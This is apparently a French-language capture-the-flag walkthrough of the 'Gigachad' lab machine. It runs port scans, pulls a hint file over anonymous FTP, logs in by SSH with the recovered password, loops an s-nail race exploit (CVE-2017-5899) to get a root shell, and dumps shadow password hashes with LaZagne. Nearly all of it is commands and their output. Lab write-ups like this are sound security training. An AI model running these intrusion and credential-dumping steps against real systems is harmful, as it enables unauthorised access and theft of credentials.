# Gigachad

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $sudo massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️  Nmap 192.168.56.254...100%

[+] 21/tcp open
[+] 22/tcp open
[+] 80/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.254-tcp.html     |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">🖥️</span> **NetExec**

Regardons les fichier disponible sur le `FTP`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $nxc ftp 192.168.56.254 -u '' -p '' --ls
FTP         192.168.56.254  21     192.168.56.254   [*] Banner: (vsFTPd 3.0.3)
FTP         192.168.56.254  21     192.168.56.254   [+] : - Anonymous Login!
FTP         192.168.56.254  21     192.168.56.254   [*] Directory Listing
FTP         192.168.56.254  21     192.168.56.254   -r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo
┌─[m0rph3u5@parrot]─[~]
└──╼ $nxc ftp 192.168.56.254 -u '' -p '' --get chadinfo
FTP         192.168.56.254  21     192.168.56.254   [*] Banner: (vsFTPd 3.0.3)
FTP         192.168.56.254  21     192.168.56.254   [+] : - Anonymous Login!
FTP         192.168.56.254  21     192.168.56.254   [+] Downloaded: chadinfo
```

&nbsp;

Contenu du fichier

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $strings chadinfo
chadinfoUT	
j `Zj `ux
why yes,
#######################
username is chad
???????????????????????
password?
!!!!!!!!!!!!!!!!!!!!!!!
go to /drippinchad.png
chadinfoUT
j `ux
```

&nbsp;

<span style="color: #dddddd;">🌍 **Google**</span>

<span style="color: #dddddd;">Apres avoir mis la photo sur google j’ai pu récupéré le nom du monument qui se trouve dessus</span>

<span style="color: #dddddd;"><<img width="538" height="117" alt="Capture du 2025-09-25 12-57-17" src="https://github.com/user-attachments/assets/4478132c-edf4-4c8d-a644-78e155ec7c3f" />
/span>

&nbsp;

<span style="color: #dddddd;">🖥️</span> **NetExec**

<span style="color: #dddddd;">Test du mot de passe trouver</span>

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $nxc ssh 192.168.56.254 -u chad -p maidenstower -x 'id'
SSH         192.168.56.254  22     192.168.56.254   [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         192.168.56.254  22     192.168.56.254   [+] chad:maidenstower  Linux - Shell access!
SSH         192.168.56.254  22     192.168.56.254   [+] Executed command
SSH         192.168.56.254  22     192.168.56.254   uid=1000(chad) gid=1000(chad) groups=1000(chad)
SSH         192.168.56.254  22     192.168.56.254   
```

&nbsp;

<span style="color: #dddddd;">🔒</span> **SSH**

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $ssh chad@192.168.56.254
The authenticity of host '192.168.56.254 (192.168.56.254)' can't be established.
ED25519 key fingerprint is SHA256:P07e9iTTwbyQae7lGtYu8i4toAyBfYkXY9/kw/dyv/4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.254' (ED25519) to the list of known hosts.
chad@192.168.56.254's password: 
Linux gigachad 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
chad@gigachad:~$ 
```

&nbsp;

🛰️ **fullEx**

Élévation de privilège

```
chad@gigachad:/tmp/fullEx$ bash fullEx.sh -perm
chad@gigachad:/tmp/fullEx$ ./fullEx.sh -LinPeas 

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

   [+] [CVE-2017-5899] s-nail-privget

   Details: https://www.openwall.com/lists/oss-security/2017/01/27/7
   Exposure: less probable
   Tags: ubuntu=16.04,manjaro=16.10
   Download URL: https://www.openwall.com/lists/oss-security/2017/01/27/7/1
   ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh
   Comments: Distros use own versioning scheme. Manual verification needed.
```

&nbsp;

<span style="color: #dddddd;">💀</span> **s-nail-privget**

Mettre une boucle pour que l’exploit réussi

```
chad@gigachad:~$ while true; do ./47172.sh ;done
[.] Race #577 of 1000 ...
[+] got root! /var/tmp/.sh (uid=0 gid=0)
[.] Cleaning up...
[+] Success:
-rwsr-xr-x 1 root root 14424 Sep 26 13:47 /var/tmp/.sh
[.] Launching root shell: /var/tmp/.sh
# id
uid=0(root) gid=0(root) groups=0(root),1000(chad)
# bash -i
root@gigachad:~#
```

&nbsp;

🛰️ **fullEx**

Recherche d’identifiant sur la machine

```
root@gigachad:/tmp/fullEx# ./fullEx.sh -LaZagne
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: chad
Hash: $6$1zsJfTK8qNk7jnv1$esRFNmOZO3yTD1KTvhd.OQU.c3UIwmDiSpZRBrwmH3Uh4aFhZMuOr30CIY.K5ao8ZBPNPHZagLjtepHlMIiwJ1:18665:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$GFEPutgi.1nJ4e5p$1qX/vWP1PCL3cGTDWNC5PUkXxTVSRuYLeIvbITXtxdbdPQDCKl.EzrzcynCPtfDbiinerU4Ae4S7XY3TLXZTB1:18613:0:99999:7:::


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 6.00176310539
```

&nbsp;

Identifiant trouver

| User | password |
| --- | --- |
| chad | maidenstower |
